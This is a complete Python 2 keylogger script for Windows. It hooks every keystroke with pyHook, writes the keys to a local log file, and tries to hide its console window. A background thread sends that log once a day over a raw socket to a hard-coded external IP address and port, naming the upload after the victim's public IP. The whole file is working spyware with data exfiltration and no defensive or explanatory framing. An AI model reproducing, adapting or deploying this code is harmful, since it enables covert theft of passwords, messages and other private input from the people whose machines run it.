#!/usr/bin/python
import pyHook
import pythoncom
import win32gui
import win32console
import socket   
import threading 
import time
import datetime
import urllib
import re
import string

def get_ip():
  data = re.search('"([0-9.]*)"', urllib.urlopen("http://ip.jsontest.com/").read()).group(1)
  #print data
  return str(data)

def send_to_Mothership():
  txt = ".txt"
  extern_ip = get_ip()
  extern_ip = extern_ip.replace('.','_')
  filename = extern_ip + txt
  print filename
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  host = '76.90.227.209' 
  port = 22555                

  s.connect((host, port))
  s.sendall(filename)
  print "Begin...\n"
  with open('log_file.txt', 'rb') as f:
      data = f.read()
  s.sendall('%16d' % len(data))
  s.sendall(data)
  print s.recv(40)
  s.close()

def calculate_Sleep(dayflag):
  for i in xrange(0,365):
      t = datetime.datetime.today()
      print t
      future = datetime.datetime(t.year,t.month,t.day,18,40)
      print future
      if dayflag == 1:
          future += datetime.timedelta(days=1)
      return ((future-t).seconds)

def Seedship_control():
  sleeptime = calculate_Sleep(0)
  while True:
    print sleeptime
    time.sleep(sleeptime)
    send_to_Mothership()
    time.sleep(1)
    sleeptime = calculate_Sleep(1)


seedship = threading.Thread(target=Seedship_control)
seedship.start()
log_file = "log_file.txt"
window = win32console.GetConsoleWindow()  #go to script window
win32gui.ShowWindow(window,5)             #hide window

def pressed_chars(event):       #on key pressed function
    if event.Ascii:
        f = open(log_file,"a")  
        char = chr(event.Ascii) 
        if event.Ascii == 13:
            f.write("[ENTER]")
        elif event.Ascii == 9:
                f.write("[TAB]")
        f.write(char)           


proc = pyHook.HookManager()      #open pyHook
proc.KeyDown = pressed_chars     #set pressed_chars function on KeyDown event
proc.HookKeyboard()              #start the function
pythoncom.PumpMessages()         #get input
